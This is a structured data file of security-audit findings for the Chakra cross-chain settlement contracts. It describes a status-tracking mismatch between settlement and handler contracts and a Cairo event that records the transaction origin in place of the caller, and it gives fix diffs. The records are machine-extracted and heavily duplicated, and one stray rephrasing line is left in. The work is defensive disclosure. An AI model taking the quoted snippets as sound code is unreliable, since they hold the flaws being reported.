}\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L329\n\nThis means that the message status will remain `PENDING` in `ChakraSettlementHandler`, while it will be `FAILED` in `ChakraSettlement`. This inconsistency breaks the invariant that \"Cross-chain transaction statuses are properly tracked and updated (Pending, Settled, or Failed).\"\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\n\n# Vulnerability details\n\n## Impact\nThere is a mismatch in the message status between `ChakraSettlement` and `ChakraSettlementHandler`.\n\n## Proof of Concept\nWhen a callback message is received, if `is_valid_handler` returns `false`, the status of the message in `ChakraSettlementHandler` is not updated.\n\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        //.....\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\nHowever, the status is updated only in `ChakraSettlement`.\n\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        //....\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L329\n\nThis means that the message status will remain `PENDING` in `ChakraSettlementHandler`, while it will be `FAILED` in `ChakraSettlement`. This inconsistency breaks the invariant that \"Cross-chain transaction statuses are properly tracked and updated (Pending, Settled, or Failed).\"\n\n## Tools Used\n\n## Recommended Mitigation Steps\nThe following change is recommended:\n\n```diff\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n+           create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\n\n# Vulnerability details\n\n## Impact\nThere is a mismatch in the message status between `ChakraSettlement` and `ChakraSettlementHandler`.\n\n## Proof of Concept\nWhen a callback message is received, if `is_valid_handler` returns `false`, the status of the message in `ChakraSettlementHandler` is not updated.\n\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        //.....\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\nHowever, the status is updated only in `ChakraSettlement`.\n\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        //....\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L329\n\nThis means that the message status will remain `PENDING` in `ChakraSettlementHandler`, while it will be `FAILED` in `ChakraSettlement`. This inconsistency breaks the invariant that \"Cross-chain transaction statuses are properly tracked and updated (Pending, Settled, or Failed).\"\n\n## Tools Used\n\n## Recommended Mitigation Steps\nThe following change is recommended:\n\n```diff\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n+           create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L375\n\n\n## Assessed type\n\nContext"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-041", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 41, "page_start": null, "title": "Wrong usage of transaction originator address instead of caller address", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173\n\n\n# Vulnerability details\n\n## Impact\nThe `from_address` parameter in the events emitted when sending a cross-chain message from Starknet is set to the transaction origin (`tx.origin`) instead of the actual caller (`msg.sender`). This causes incorrect data to be emitted in the event.\n\n## Proof of Concept\nWhen a cross-chain message is sent from Starknet using the function `handler_erc20::cross_chain_erc20_settlement`, the function `settlement::send_cross_chain_msg` is called:\n- See `handler_erc20::cross_chain_erc20_settlement`:\n  https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L216\n- See `settlement::send_cross_chain_msg`:\n  https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L284\n\nWithin this function, the `CrossChainMsg` event is emitted for validators to pick up:\n```rust\n            self\n                .emit(\n                    CrossChainMsg {\n                        cross_chain_settlement_id: cross_chain_settlement_id,\n                        from_address: get_tx_info().unbox().account_contract_address,\n                        from_chain: from_chain,\n                        to_chain: to_chain,\n                        from_handler: from_handler,\n                        to_handler: to_handler,\n                        payload_type: payload_type,\n                        payload: payload\n                    }\n                );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L299\n\nThe issue is that `from_address` is set to `get_tx_info().unbox().account_contract_address`, which represents \"The account contract from which this transaction originates.\" This is equivalent to `tx.origin` in EVM-based blockchains:\nhttps://github.com/starkware-libs/cairo/blob/main/corelib/src/starknet/info.cairo#L46\n\nThis is incorrect because the address of the original transaction sender is irrelevant. Instead, `from_address` should represent the caller of the `handler_erc20::cross_chain_erc20_settlement` function.\n\nIn contrast, the EVM-based code correctly sets `from_address` to the parameter forwarded by the `ChakraSettlementHandler::cross_chain_erc20_settlement` function, which is equivalent to `msg.sender`:\n```solidity\n            // Send the cross-chain message\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L205\n```solidity\n    function send_cross_chain_msg(\n        string memory to_chain,\n        address from_address,\n        uint256 to_handler,\n        PayloadType payload_type,\n        bytes calldata payload\n    ) external {\n        //.....\n        emit CrossChainMsg(\n            txid,\n            from_address,\n            contract_chain_name,\n            to_chain,\n            from_handler,\n            to_handler,\n            payload_type,\n            payload\n        );\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L113\n\nBy using the transaction originators address (`tx.origin`) as `from_address`, the event may include an address that is irrelevant to the cross-chain transaction. This can result in misleading information for any third parties reading the events. Here are two scenarios where an incorrect `from_address` might be used:\n\nHere is the simplified rephrased version of the report:\n\n- **First Scenario:** Imagine Alice sends an NFT to Bob's contract using the `safe_transfer` function. This function makes an external call to Bob's contract. During this call, if Bob's contract calls `handler_erc20::cross_chain_erc20_settlement` to send a cross-chain message from Starknet to another chain, the `CrossChainMsg` event will show Alice's address as `from_address` because Alice was the original sender of the transaction. This is incorrect because it is actually Bob's contract sending the cross-chain message, so `from_address` should be Bob's contract address, not Alice's.\n https://github.com/OpenZeppelin/cairo-contracts/blob/main/packages/token/src/erc721/erc721.cairo#L571\n ```rust\n    // This is Bob's contract\n    // When Alice transfers NFT to Bob's contract, this function is called.\n        fn on_erc721_received(\n            self: @ComponentState<TContractState>,\n            operator: ContractAddress,\n            from: ContractAddress,\n            token_id: u256,\n            data: Span<felt252>\n        ) -> felt252 {\n            // Calling `handler_erc20::cross_chain_erc20_settlement`\n            //.....\n        }\n```\n\n- **Second Scenario:** Consider a scenario where a message is bridged from Ethereum (L1) to Starknet (L2) with Starknet validators managing the bridging process. When the message arrives on Starknet, the function marked with `#[l1_handler]` in the target contract is called by StarknetOS. **In this situation, calling `get_caller_address()` in that function returns zero.** If this function then calls `handler_erc20::cross_chain_erc20_settlement`, the `CrossChainMsg` event will show `from_address` as zero, since the original sender was StarknetOS. This is incorrect because `from_address` should be the target contract's address, not zero.\nhttps://book.cairo-lang.org/ch16-04-L1-L2-messaging.html?highlight=%23%5Bl1_handler%5D#sending-messages-from-ethereum-to-starknet\nhttps://docs.cairo-lang.org/hello_starknet/user_auth.html#getting-the-caller-address\nhttps://cairopractice.com/posts/get_caller_address_zero/\n```rust\n    // This is the target contract\n    // This function is called by StarknetOS\n    #[l1_handler]\n    fn msg_handler_felt(ref self: ContractState, from_address: felt252, my_felt: felt252) {\n        // Calling get_caller_address() here returns zero\n        // Calling `handler_erc20::cross_chain_erc20_settlement`\n        //.....\n    }\n```\n\nAdditionally, when a callback message is received, the `CrossChainResult` event will show `from_address` as `get_tx_info().unbox().account_contract_address`, which is also incorrect and misleading.\n\n## Tools Used\n\n## Recommended Mitigation Steps\nFollowing modifications are recommended:\n\n```diff\n        fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n            assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n            let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n            let from_chain = settlement.chain_name();\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token_burnable.burn_from(get_caller_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }\n\n            let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n            let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n                    tx_id: tx_id,\n                    from_chain: from_chain,\n                    to_chain: to_chain,\n                    from: get_contract_address(),\n                    to: to,\n                    from_token: self.token_address.read(),\n                    to_token: to_token,\n                    amount: amount,\n                    tx_status: CrossChainTxStatus::PENDING\n                };\n            self.created_tx.write(tx_id, tx);\n            self.msg_count.write(self.msg_count.read()+1);\n            // message id = message count\n            let message_id = tx_id;\n            let transfer = ERC20Transfer{\n                method_id: 1,\n                from: contract_address_to_u256(get_caller_address()),\n                to: to,\n                from_token: contract_address_to_u256(self.token_address.read()),\n                to_token: to_token,\n                amount: amount\n            };\n\n            let message = Message{\n                version: 1,\n                message_id: message_id.into(),\n                payload_type: PayloadType::ERC20,\n                payload: encode_transfer(transfer),\n            };\n\n            // send cross chain msg\n-           settlement.send_cross_chain_msg(to_chain, to_handler, PayloadType::ERC20, encode_message(message));\n+           settlement.send_cross_chain_msg(to_chain, to_handler, PayloadType::ERC20, encode_message(message),\n+           get_caller_address());\n            // emit CrossChainLocked\n\n            self.emit(\n                    CrossChainLocked{\n                        tx_id: tx_id,\n                        from: get_caller_address(),\n                        to: to,\n                        from_chain: get_tx_info().unbox().chain_id,\n                        to_chain: to_chain,\n                        from_token: self.token_address.read(),\n                        to_token: to_token,\n                        amount: amount\n                    }\n                );\n            return tx_id;\n        }\n```\n```diff\n        fn send_cross_chain_msg(\n            ref self: ContractState, to_chain: felt252, to_handler: u256, payload_type :u8,payload: Array<u8>,\n+           from_address: felt252,\n        ) -> felt252 {\n            let from_handler = get_caller_address();\n            let from_chain = self.chain_name.read();\n            let cross_chain_settlement_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.tx_count.read());\n            self.created_tx.write(cross_chain_settlement_id, CreatedTx{\n                tx_id:cross_chain_settlement_id,\n                tx_status: CrossChainMsgStatus::PENDING,\n                from_chain: from_chain,\n                to_chain: to_chain,\n                from_handler: from_handler,\n                to_handler: to_handler\n            });\n\n            self\n                .emit(\n                    CrossChainMsg {\n                        cross_chain_settlement_id: cross_chain_settlement_id,\n-                       from_address: get_tx_info().unbox().account_contract_address,\n+                       from_address: from_address,\n                        from_chain: from_chain,\n                        to_chain: to_chain,\n                        from_handler: from_handler,\n                        to_handler: to_handler,\n                        payload_type: payload_type,\n                        payload: payload\n                    }\n                );\n            self.tx_count.write(self.tx_count.read()+1);\n            return cross_chain_settlement_id;\n        }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L284\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe `from_address` parameter in the events emitted when sending a cross-chain message from Starknet is set to the transaction origin (`tx.origin`) instead of the actual caller (`msg.sender`). This causes incorrect data to be emitted in the event.\n", "recommendation_md": "## Recommended Mitigation Steps\nFollowing modifications are recommended:\n\n```diff\n        fn cross_chain_erc20_settlement(ref self: ContractState, to_chain: felt252, to_handler: u256, to_token: u256, to: u256, amount: u256) -> felt252{\n            assert(self.support_handler.read((to_chain, to_handler)), 'not support handler');\n            let settlement = IChakraSettlementDispatcher {contract_address: self.settlement_address.read()};\n            let from_chain = settlement.chain_name();\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            let token_burnable = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token_burnable.burn_from(get_caller_address(), amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer_from(get_caller_address(), get_contract_address(), amount);\n            }\n\n            let tx_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.msg_count.read());\n            let tx: CreatedCrossChainTx = CreatedCrossChainTx{\n                    tx_id: tx_id,\n                    from_chain: from_chain,\n                    to_chain: to_chain,\n                    from: get_contract_address(),\n                    to: to,\n                    from_token: self.token_address.read(),\n                    to_token: to_token,\n                    amount: amount,\n                    tx_status: CrossChainTxStatus::PENDING\n                };\n            self.created_tx.write(tx_id, tx);\n            self.msg_count.write(self.msg_count.read()+1);\n            // message id = message count\n            let message_id = tx_id;\n            let transfer = ERC20Transfer{\n                method_id: 1,\n                from: contract_address_to_u256(get_caller_address()),\n                to: to,\n                from_token: contract_address_to_u256(self.token_address.read()),\n                to_token: to_token,\n                amount: amount\n            };\n\n            let message = Message{\n                version: 1,\n                message_id: message_id.into(),\n                payload_type: PayloadType::ERC20,\n                payload: encode_transfer(transfer),\n            };\n\n            // send cross chain msg\n-           settlement.send_cross_chain_msg(to_chain, to_handler, PayloadType::ERC20, encode_message(message));\n+           settlement.send_cross_chain_msg(to_chain, to_handler, PayloadType::ERC20, encode_message(message),\n+           get_caller_address());\n            // emit CrossChainLocked\n\n            self.emit(\n                    CrossChainLocked{\n                        tx_id: tx_id,\n                        from: get_caller_address(),\n                        to: to,\n                        from_chain: get_tx_info().unbox().chain_id,\n                        to_chain: to_chain,\n                        from_token: self.token_address.read(),\n                        to_token: to_token,\n                        amount: amount\n                    }\n                );\n            return tx_id;\n        }\n```\n```diff\n        fn send_cross_chain_msg(\n            ref self: ContractState, to_chain: felt252, to_handler: u256, payload_type :u8,payload: Array<u8>,\n+           from_address: felt252,\n        ) -> felt252 {\n            let from_handler = get_caller_address();\n            let from_chain = self.chain_name.read();\n            let cross_chain_settlement_id = LegacyHash::hash(get_tx_info().unbox().transaction_hash, self.tx_count.read());\n            self.created_tx.write(cross_chain_settlement_id, CreatedTx{\n                tx_id:cross_chain_settlement_id,\n                tx_status: CrossChainMsgStatus::PENDING,\n                from_chain: from_chain,\n                to_chain: to_chain,\n                from_handler: from_handler,\n                to_handler: to_handler\n            });\n\n            self\n                .emit(\n                    CrossChainMsg {\n                        cross_chain_settlement_id: cross_chain_settlement_id,\n-                       from_address: get_tx_info().unbox().account_contract_address,\n+                       from_address: from_address,\n                        from_chain: from_chain,\n                        to_chain: to_chain,\n                        from_handler: from_handler,\n                        to_handler: to_handler,\n                        payload_type: payload_type,\n                        payload: payload\n                    }\n                );\n            self.tx_count.write(self.tx_count.read()+1);\n            return cross_chain_settlement_id;\n        }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L284\n\n\n## Assessed type\n\nContext\n", "poc_md": "## Proof of Concept\nWhen a cross-chain message is sent from Starknet using the function `handler_erc20::cross_chain_erc20_settlement`, the function `settlement::send_cross_chain_msg` is called:\n- See `handler_erc20::cross_chain_erc20_settlement`:\n  https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L216\n- See `settlement::send_cross_chain_msg`:\n  https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L284\n\nWithin this function, the `CrossChainMsg` event is emitted for validators to pick up:\n```rust\n            self\n                .emit(\n                    CrossChainMsg {\n                        cross_chain_settlement_id: cross_chain_settlement_id,\n                        from_address: get_tx_info().unbox().account_contract_address,\n                        from_chain: from_chain,\n                        to_chain: to_chain,\n                        from_handler: from_handler,\n                        to_handler: to_handler,\n                        payload_type: payload_type,\n                        payload: payload\n                    }\n                );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L299\n\nThe issue is that `from_address` is set to `get_tx_info().unbox().account_contract_address`, which represents \"The account contract from which this transaction originates.\" This is equivalent to `tx.origin` in EVM-based blockchains:\nhttps://github.com/starkware-libs/cairo/blob/main/corelib/src/starknet/info.cairo#L46\n\nThis is incorrect because the address of the original transaction sender is irrelevant. Instead, `from_address` should represent the caller of the `handler_erc20::cross_chain_erc20_settlement` function.\n\nIn contrast, the EVM-based code correctly sets `from_address` to the parameter forwarded by the `ChakraSettlementHandler::cross_chain_erc20_settlement` function, which is equivalent to `msg.sender`:\n```solidity\n            // Send the cross-chain message\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L205\n```solidity\n    function send_cross_chain_msg(\n        string memory to_chain,\n        address from_address,\n        uint256 to_handler,\n        PayloadType payload_type,\n        bytes calldata payload\n    ) external {\n        //.....\n        emit CrossChainMsg(\n            txid,\n            from_address,\n            contract_chain_name,\n            to_chain,\n            from_handler,\n            to_handler,\n            payload_type,\n            payload\n        );\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L113\n\nBy using the transaction originators address (`tx.origin`) as `from_address`, the event may include an address that is irrelevant to the cross-chain transaction. This can result in misleading information for any third parties reading the events. Here are two scenarios where an incorrect `from_address` might be used:\n\nHere is the simplified rephrased version of the report:\n\n- **First Scenario:** Imagine Alice sends an NFT to Bob's contract using the `safe_transfer` function. This function makes an external call to Bob's contract. During this call, if Bob's contract calls `handler_erc20::cross_chain_erc20_settlement` to send a cross-chain message from Starknet to another chain, the `CrossChainMsg` event will show Alice's address as `from_address` because Alice was the original sender of the transaction. This is incorrect because it is actually Bob's contract sending the cross-chain message, so `from_address` should be Bob's contract address, not Alice's.\n https://github.com/OpenZeppelin/cairo-contracts/blob/main/packages/token/src/erc721/erc721.cairo#L571\n ```rust\n    // This is Bob's contract\n    // When Alice transfers NFT to Bob's contract, this function is called.\n        fn on_erc721_received(\n            self: @ComponentState<TContractState>,\n            operator: ContractAddress,\n            from: ContractAddress,\n            token_id: u256,\n            data: Span<felt252>\n        ) -> felt252 {\n            // Calling `handler_erc20::cross_chain_erc20_settlement`\n            //.....\n        }\n```\n\n- **Second Scenario:** Consider a scenario where a message is bridged from Ethereum (L1) to Starknet (L2) with Starknet validators managing the bridging process. When the message arrives on Starknet, the function marked with `#[l1_handler]` in the target contract is called by StarknetOS. **In this situation, calling `get_caller_address()` in that function returns zero.** If this function then calls `handler_erc20::cross_chain_erc20_settlement`, the `CrossChainMsg` event will show `from_address` as zero, since the original sender was StarknetOS. This is incorrect because `from_address` should be the target contract's address, not zero.\nhttps://book.cairo-lang.org/ch16-04-L1-L2-messaging.html?highlight=%23%5Bl1_handler%5D#sending-messages-from-ethereum-to-starknet\nhttps://docs.cairo-lang.org/hello_starknet/user_auth.html#getting-the-caller-address\nhttps://cairopractice.com/posts/get_caller_address_zero/\n```rust\n    // This is the target contract\n    // This function is called by StarknetOS\n    #[l1_handler]\n    fn msg_handler_felt(ref self: ContractState, from_address: felt252, my_felt: felt252) {\n        // Calling get_caller_address() here returns zero\n        // Calling `handler_erc20::cross_chain_erc20_settlement`\n        //.....\n    }\n```\n\nAdditionally, when a callback message is received, the `CrossChainResult` event will show `from_address` as `get_tx_info().unbox().account_contract_address`, which is also incorrect and misleading.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173\n\n\n# Vulnerability details\n\n## Impact\nThe `from_address` parameter in the events emitted when sending a cross-chain message from Starknet is set to the transaction origin (`tx.origin`) instead of the actual caller (`msg.sender`). This causes incorrect data to be emitted in the event.\n\n## Proof of Concept\nWhen a cross-chain message is sent from Starknet using the function `handler_erc20::cross_chain_erc20_settlement`, the function `settlement::send_cross_chain_msg` is called:\n- See `handler_erc20::cross_chain_erc20_settlement`:\n  https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L216\n- See `settlement::send_cross_chain_msg`:\n  https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L284\n\nWithin this function, the `CrossChainMsg` event is emitted for validators to pick up:\n```rust\n            self\n                .emit(\n                    CrossChainMsg {\n                        cross_chain_settlement_id: cross_chain_settlement_id,\n                        from_address: get_tx_info().unbox().account_contract_address,\n                        from_chain: from_chain,\n                        to_chain: to_chain,\n                        from_handler: from_handler,\n                        to_handler: to_handler,\n                        payload_type: payload_type,\n                        payload: payload\n                    }\n                );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L299\n\nThe issue is that `from_address` is set to `get_tx_info().unbox().account_contract_address`, which represents \"The account contract from which this transaction originates.\" This is equivalent to `tx.origin` in EVM-based blockchains:\nhttps://github.com/starkware-libs/cairo/blob/main/corelib/src/starknet/info.cairo#L46\n\nThis is incorrect because the address of the original transaction sender is irrelevant. Instead, `from_address` should represent the caller of the `handler_erc20::cross_chain_erc20_settlement` function.\n\nIn contrast, the EVM-based code correctly sets `from_address` to the parameter forwarded by the `ChakraSettlementHandler::cross_chain_erc20_settlement` function, which is equivalent to `msg.sender`:\n```solidity\n            // Send the cross-chain message\n            settlement.send_cross_chain_msg(\n                to_chain,\n                msg.sender,\n                to_handler,\n                PayloadType.ERC20,\n                cross_chain_msg_bytes\n            );\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L205\n```solidity\n    function send_cross_chain_msg(\n        string memory to_chain,\n        address from_address,\n        uint256 to_handler,\n        PayloadType payload_type,\n        bytes calldata payload\n    ) external {\n        //.....\n        emit CrossChainMsg(\n            txid,\n            from_address,\n            contract_chain_name,\n            to_chain,\n            from_handler,\n            to_handler,\n            payload_type,\n            payload\n        );\n    }\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L113\n\nBy using the transaction originators address (`tx.origin`) as `from_address`, the event may include an address that is irrelevant to the cross-chain transaction. This can result in misleading information for any third parties reading the events. Here are two scenarios where an incorrect `from_address` might be used:\n\nHere is the simplified rephrased version of the report:\n\n- **First Scenario:** Imagine Alice sends an NFT to Bob's contract using the `safe_transfer` function. This function makes an external call to Bob's contract. During this call, if Bob's contract calls `handler_erc20::cross_chain_erc20_settlement` to send a cross-chain message from Starknet to another chain, the `CrossChainMsg` event will show Alice's address as `from_address` because Alice was the original sender of the transaction. This is incorrect because it is actually Bob's contract sending the cross-chain message, so `from_address` should be Bob's contract address, not Alice's.\n https://github.com/OpenZeppelin/cairo-contracts/blob/main/packages/token/src/erc721/erc721.cairo#L571\n ```rust\n    // This is Bob's contract\n    // When Alice transfers NFT to Bob's contract, this function is called.\n        fn on_erc721_received(\n            self: @ComponentState<TContractState>,\n            operator: ContractAddress,\n            from: ContractAddress,\n            token_id: u256,\n            data: Span<felt252>\n        ) -> felt252 {\n            // Calling `handler_erc20::cross_chain_erc20_settlement`\n            //.....\n        }\n```\n\n- **Second Scenario:** Consider a scenario where a message is bridged from Ethereum (L1) to Starknet (L2) with Starknet validators managing the bridging process. When the message arrives on Starknet, the function marked with `#[l1_handler]` in the target contract is called by StarknetOS. **In this situation, calling `get_caller_address()` in that function returns zero.** If this function then calls `handler_erc20::cross_chain_erc20_settlement`, the `CrossChainMsg` event will show `from_address` as zero, since the original sender was StarknetOS. This is incorrect because `from_address` should be the target contract's address, not zero.\nhttps://book.cairo-lang.org/ch16-04-L1-L2-messaging.html?highlight=%23%5Bl1_handler%5D#sending-messages-from-ethereum-to-starknet\nhttps://docs.cairo-lang.org/hello_starknet/user_auth.html#getting-the-caller-address\nhttps://cairopractice.com/posts/get_caller_address_zero/\n```rust\n    // This is the target contract\n    // This function is called by StarknetOS\n    #[l1_handler]\n    fn msg_handler_felt(ref self: ContractState, from_address: felt252, my_felt: felt252) {\n        // Calling get_caller_address() here returns zero\n        // Calling `handler_erc20::cross_chain_erc20_settlement`\n        